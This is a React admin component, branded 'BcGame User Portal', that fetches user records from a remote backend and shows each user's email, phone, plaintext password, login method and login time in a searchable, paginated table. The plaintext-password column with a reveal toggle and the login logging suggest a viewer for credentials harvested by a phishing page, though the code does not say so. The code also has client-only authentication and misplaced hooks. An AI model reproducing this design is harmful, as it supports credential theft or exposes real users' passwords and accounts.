import React, { useState, useEffect } from 'react';
import { Navigate } from 'react-router-dom';

const UserDataTable = () => {
  const [userData, setUserData] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [searchTerm, setSearchTerm] = useState('');
  const [currentPage, setCurrentPage] = useState(1);
  const [showPassword, setShowPassword] = useState({});
  const [totalUsers, setTotalUsers] = useState(0);
  const [retryCount, setRetryCount] = useState(0);
  const usersPerPage = 10;
  
  // Check authentication before rendering content
  const isAuthenticated = localStorage.getItem('adminToken') !== null;
  
  if (!isAuthenticated) {
    return <Navigate to="/login" />;
  }

  // Use effect to fetch data when component mounts or retryCount changes
  useEffect(() => {
    fetchUserData();
  }, [retryCount]);

  const fetchUserData = async () => {
    try {
      setLoading(true);
      
      // Get token from localStorage
      const token = localStorage.getItem('adminToken');
      
      // Fetch data from the API with the token in the header
      const response = await fetch('https://bc-games-backend.vercel.app/api/users', {
        headers: {
          'x-auth-token': token
        }
      });
      
      if (!response.ok) {
        // If unauthorized, clear token and redirect to login
        if (response.status === 401) {
          localStorage.removeItem('adminToken');
          localStorage.removeItem('adminName');
          window.location.href = '/admin/login';
          return;
        }
        throw new Error('Failed to fetch user data');
      }
      
      const data = await response.json();
      
      // Check if data is an array of users
      if (Array.isArray(data)) {
        // Format the data properly
        const formattedData = data.map((user, index) => ({
          id: user.id || `user-${index}`,
          email: user.email || '',
          phone: user.phone || '',
          password: user.password || '', 
          date: user.loginDate || user.createdAt || '',
          time: user.loginTime || '',
          loginMethod: user.loginMethod || ''
        }));
        
        setUserData(formattedData);
        setTotalUsers(formattedData.length);
      } else if (data && typeof data === 'object') {
        // Handle case where API returned a single user object
        console.warn('API returned a single user instead of an array');
        const singleUser = {
          id: data.id || 'user-1',
          email: data.email || '',
          phone: data.phone || '',
          password: data.password || '', 
          date: data.loginDate || data.createdAt || '',
          time: data.loginTime || '',
          loginMethod: data.loginMethod || ''
        };
        
        setUserData([singleUser]);
        setTotalUsers(1);
      } else {
        throw new Error('Invalid data format received from API');
      }
      
      setLoading(false);
      setError('');
      
    } catch (err) {
      console.error('Error fetching user data:', err);
      setError('Failed to load user data. Please try again later.');
      setLoading(false);
    }
  };

  const togglePasswordVisibility = (userId) => {
    setShowPassword(prev => ({
      ...prev,
      [userId]: !prev[userId]
    }));
  };

  // Filter users based on search term
  const filteredUsers = userData.filter(user => 
    (user.email && user.email.toLowerCase().includes(searchTerm.toLowerCase())) ||
    (user.phone && user.phone.toLowerCase().includes(searchTerm.toLowerCase())) ||
    (user.date && user.date.toLowerCase().includes(searchTerm.toLowerCase())) ||
    (user.time && user.time.toLowerCase().includes(searchTerm.toLowerCase())) ||
    (user.loginMethod && user.loginMethod.toLowerCase().includes(searchTerm.toLowerCase()))
  );

  // Pagination
  const indexOfLastUser = currentPage * usersPerPage;
  const indexOfFirstUser = indexOfLastUser - usersPerPage;
  const currentUsers = filteredUsers.slice(indexOfFirstUser, indexOfLastUser);
  const totalPages = Math.ceil(filteredUsers.length / usersPerPage);

  // Change page
  const paginate = (pageNumber) => setCurrentPage(pageNumber);

  // Handle retry
  const handleRetry = () => {
    setRetryCount(prevCount => prevCount + 1);
  };

  // Handle logout
  const handleLogout = () => {
    localStorage.removeItem('adminToken');
    localStorage.removeItem('adminName');
    window.location.href = '/login';
  };

  if (loading) {
    return (
      <div className="user-loading-container">
        <div className="user-loading-box">
          <div className="user-spinner"></div>
          Loading user data...
        </div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="user-error-container">
        <div className="user-error-box">
          <div className="user-error-message">{error}</div>
          <button 
            onClick={handleRetry}
            className="user-retry-button"
          >
            Try Again
          </button>
        </div>
      </div>
    );
  }

  const adminName = localStorage.getItem('adminName') || 'Admin';

  return (
    <div className="user-container">
      <style>
        {`
          /* User Container Styles */
          .user-container {
            min-height: 100vh;
            background-color: #f0f2f5;
            padding: 20px;
            font-family: Arial, sans-serif;
          }
          
          .user-content {
            max-width: 1200px;
            margin: 0 auto;
          }
          
          .user-card {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            overflow: hidden;
          }
          
          /* User Header Styles */
          .user-header {
            background-color: #2c3e50;
            color: white;
            padding: 16px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
          }
          
          .user-title-container {
            display: flex;
            flex-direction: column;
          }
          
          .user-title {
            font-size: 22px;
            font-weight: bold;
            margin: 0;
          }
          
          .user-count {
            font-size: 14px;
            margin-top: 4px;
            color: rgba(255,255,255,0.8);
          }
          
          .user-search-container {
            position: relative;
          }
          
          .user-search-input {
            padding: 8px 12px 8px 36px;
            border-radius: 20px;
            border: none;
            background-color: rgba(255,255,255,0.2);
            color: white;
            width: 250px;
            font-size: 14px;
          }
          
          .user-search-input::placeholder {
            color: rgba(255,255,255,0.7);
          }
          
          .user-search-icon {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: rgba(255,255,255,0.7);
            font-size: 16px;
          }
          
          /* User Table Styles */
          .user-table-container {
            overflow-x: auto;
          }
          
          .user-table {
            width: 100%;
            border-collapse: collapse;
          }
          
          .user-table th {
            background-color: #f8f9fa;
            color: #555;
            font-weight: 600;
            text-align: left;
            padding: 12px 16px;
            border-bottom: 2px solid #eee;
          }
          
          .user-table td {
            padding: 12px 16px;
            border-bottom: 1px solid #eee;
          }
          
          .user-table tr:nth-child(even) {
            background-color:rgb(248, 249, 250);
          }
          
          .user-table tr:hover {
            background-color:rgba(52, 152, 219, 0.1);
          }
          
          /* User Password Styles */
          .user-password-container {
            display: flex;
            align-items: center;
          }
          
          .user-password-toggle {
            background: none;
            border: none;
            cursor: pointer;
            color: #3498db;
            font-size: 18px;
            margin-left: 8px;
          }
          
          /* User Pagination Styles */
          .user-pagination {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px;
            background-color: #f8f9fa;
            border-top: 1px solid #eee;
          }
          
          .user-pagination-mobile {
            display: flex;
            justify-content: space-between;
            width: 100%;
          }
          
          .user-pagination-desktop {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
          }
          
          .user-pagination-info {
            color: #666;
            font-size: 14px;
          }
          
          .user-pagination-info span {
            font-weight: bold;
          }
          
          .user-pagination-nav {
            display: flex;
            gap: 5px;
          }
          
          .user-pagination-button {
            padding: 6px 12px;
            border: 1px solid #ddd;
            background-color: white;
            cursor: pointer;
            font-size: 14px;
            border-radius: 4px;
          }
          
          .user-pagination-button:disabled {
            background-color: #f5f5f5;
            color: #aaa;
            cursor: not-allowed;
          }
          
          .user-pagination-button.active {
            background-color: #3498db;
            color: white;
            border-color: #3498db;
          }
          
          /* User Loading Styles */
          .user-loading-container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f2f5;
          }
          
          .user-loading-box {
            padding: 20px;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            text-align: center;
            font-size: 16px;
            color: #555;
            display: flex;
            align-items: center;
          }
          
          .user-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #3498db;
            border-radius: 50%;
            border-top-color: transparent;
            margin-right: 10px;
            animation: user-spin 1s linear infinite;
          }
          
          @keyframes user-spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
          
          /* User Error Styles */
          .user-error-container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f2f5;
            padding: 20px;
          }
          
          .user-error-box {
            padding: 30px;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 500px;
            width: 100%;
          }
          
          .user-error-message {
            color: #e74c3c;
            margin-bottom: 20px;
            font-weight: bold;
            font-size: 16px;
          }
          
          .user-retry-button {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
          }
          
          .user-footer {
            text-align: center;
            margin-top: 20px;
            color: #888;
            font-size: 14px;
          }
          
          /* Admin Header Styles */
          .admin-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
          }
          
          .admin-welcome {
            font-size: 18px;
            color: #444;
          }
          
          .admin-actions {
            display: flex;
            gap: 10px;
          }
          
          .admin-button {
            padding: 8px 16px;
            background-color: #3498db;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 5px;
          }
          
          .admin-button.logout {
            background-color: #e74c3c;
          }
          
          /* Responsiveness */
          @media (max-width: 768px) {
            .user-pagination-desktop {
              display: none;
            }
            
            .user-header {
              flex-direction: column;
              gap: 10px;
              align-items: flex-start;
            }
            
            .user-search-input {
              width: 100%;
            }
            
            .admin-header {
              flex-direction: column;
              align-items: flex-start;
              gap: 10px;
            }
          }
          
          @media (min-width: 769px) {
            .user-pagination-mobile {
              display: none;
            }
          }
        `}
      </style>
      
      <div className="user-content">
        <div className="admin-header">
          <div className="admin-welcome">
            Welcome, <strong>{adminName}</strong>
          </div>
          <div className="admin-actions">
            <button className="admin-button logout" onClick={handleLogout}>
              Logout
            </button>
          </div>
        </div>
        
        <div className="user-card">
          {/* Header */}
          <div className="user-header">
            <div className="user-title-container">
              <h1 className="user-title">User Data</h1>
              <div className="user-count">Total Users: {totalUsers}</div>
            </div>
            <div className="user-search-container">
              <input
                type="text"
                placeholder="Search..."
                className="user-search-input"
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
              />
              <span className="user-search-icon">🔍</span>
            </div>
          </div>
          
          {/* Table */}
          <div className="user-table-container">
            <table className="user-table">
              <thead>
                <tr>
                  <th>#</th>
                  <th>Email</th>
                  <th>Phone</th>
                  <th>Password</th>
                  <th>Login Method</th>
                  <th>Date</th>
                  <th>Time</th>
                </tr>
              </thead>
              <tbody style={{color:'black'}}>
                {currentUsers.length > 0 ? (
                  currentUsers.map((user, index) => (
                    <tr key={user.id}>
                      <td>{indexOfFirstUser + index + 1}</td>
                      <td>{user.email}</td>
                      <td>{user.phone}</td>
                      <td>
                        <div className="user-password-container">
                          <span>{showPassword[user.id] ? user.password : '••••••••'}</span>
                          <button 
                            onClick={() => togglePasswordVisibility(user.id)}
                            className="user-password-toggle"
                            aria-label={showPassword[user.id] ? "Hide password" : "Show password"}
                          >
                            {showPassword[user.id] ? '👁️' : '👁️‍🗨️'}
                          </button>
                        </div>
                      </td>
                      <td>{user.loginMethod}</td>
                      <td>{user.date}</td>
                      <td>{user.time}</td>
                    </tr>
                  ))
                ) : (
                  <tr>
                    <td colSpan="7" style={{textAlign: 'center', color: '#777', padding: '20px'}}>
                      No users found
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
          
          {/* Pagination */}
          {totalPages > 1 && (
            <div className="user-pagination">
              <div className="user-pagination-mobile">
                <button
                  onClick={() => paginate(currentPage > 1 ? currentPage - 1 : 1)}
                  disabled={currentPage === 1}
                  className="user-pagination-button"
                >
                  Previous
                </button>
                <button
                  onClick={() => paginate(currentPage < totalPages ? currentPage + 1 : totalPages)}
                  disabled={currentPage === totalPages}
                  className="user-pagination-button"
                >
                  Next
                </button>
              </div>
              <div className="user-pagination-desktop">
                <div className="user-pagination-info">
                  Showing <span>{indexOfFirstUser + 1}</span> to{' '}
                  <span>
                    {indexOfLastUser > filteredUsers.length ? filteredUsers.length : indexOfLastUser}
                  </span>{' '}
                  of <span>{filteredUsers.length}</span> results
                </div>
                <div className="user-pagination-nav">
                  <button
                    onClick={() => paginate(currentPage > 1 ? currentPage - 1 : 1)}
                    disabled={currentPage === 1}
                    className="user-pagination-button"
                  >
                    &laquo;
                  </button>
                  
                  {/* Page numbers - limit display to 5 pages at a time */}
                  {(() => {
                    const pageNumbers = [];
                    let startPage = Math.max(1, currentPage - 2);
                    let endPage = Math.min(totalPages, startPage + 4);
                    
                    if (endPage - startPage < 4) {
                      startPage = Math.max(1, endPage - 4);
                    }
                    
                    for (let i = startPage; i <= endPage; i++) {
                      pageNumbers.push(i);
                    }
                    
                    return pageNumbers.map(number => (
                      <button
                        key={number}
                        onClick={() => paginate(number)}
                        className={`user-pagination-button ${currentPage === number ? 'active' : ''}`}
                      >
                        {number}
                      </button>
                    ));
                  })()}
                  
                  <button
                    onClick={() => paginate(currentPage < totalPages ? currentPage + 1 : totalPages)}
                    disabled={currentPage === totalPages}
                    className="user-pagination-button"
                  >
                    &raquo;
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>

        <div className="user-footer">
          &copy; {new Date().getFullYear()} BcGame User Portal
        </div>
      </div>
    </div>
  );
};

export default UserDataTable;